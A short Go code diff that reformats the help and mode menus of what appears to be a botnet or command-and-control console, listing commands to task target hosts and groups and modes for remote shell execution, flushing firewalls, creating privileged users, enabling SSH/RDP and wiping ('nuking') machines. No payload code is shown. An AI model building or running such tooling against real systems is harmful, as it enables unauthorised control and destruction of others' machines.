@@ -293,12 +293,12 @@ User: %s
 CAPABILITY				SYNTAX
 ------------------------------------------------------------------------------------------
 
-NEW ACTION:				action <target_hostname> <mode_code> <arguments>
-NEW GROUP ACTION:		gaction <target_groupname> <mode_code> <arguments>
-SHOW RESULT:			result <uuid>
-LIST AVAILABLE <X>:		list <modes/hosts/host/groups/group/bots/actions> <OPT:host/group>
-HELP MENU				help
-QUIT PROMPT				exit
+NEW ACTION:             action <target_hostname> <mode_code> <arguments>
+NEW GROUP ACTION:       gaction <target_groupname> <mode_code> <arguments>
+SHOW RESULT:            result <uuid>
+LIST AVAILABLE <X>:     list <modes/hosts/host/groups/group/bots/actions> <OPT:host/group>
+HELP MENU               help
+QUIT PROMPT             exit
 `, DTSERVER, DTUSER)
 	return ret
 }
@@ -309,13 +309,13 @@ func handleExitKW() string {
 
 func handleListModes() string {
 	return `
-MODE	DESC			ARGS	
+MODE    DESC                ARGS	
 -------------------------------------
-1		shell exec				<shell command>
-2		firewall flush			N/A
-3		create priv user		<username>
-4		enable SSH/RDP			N/A
-F		nuke the box			N/A
+  1     shell exec          <shell command>
+  2     firewall flush      N/A
+  3     create priv user    <username>
+  4     enable SSH/RDP      N/A
+  F     nuke the box        N/A
 `
 }
 
